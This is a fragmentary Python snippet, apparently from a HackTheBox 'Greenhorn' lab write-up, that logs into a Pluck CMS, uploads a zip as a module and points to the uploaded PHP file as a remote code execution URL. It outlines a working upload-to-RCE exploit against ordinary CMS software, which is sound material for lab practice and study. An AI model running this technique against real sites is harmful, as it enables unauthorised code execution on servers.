...
multipart_data = MultipartEncoder(
    fields={"sendfile": ("mirabbas.zip", open(file_path, "rb"), "application/zip"), "submit": "Upload"}
)
...
if login_response.status_code == 200:
    ...
    upload_headers = {"Referer": upload_url, "Content-Type": multipart_data.content_type}
...
rce_url = "http://greenhorn.htb/pluck/data/modules/mirabbas/miri.php"
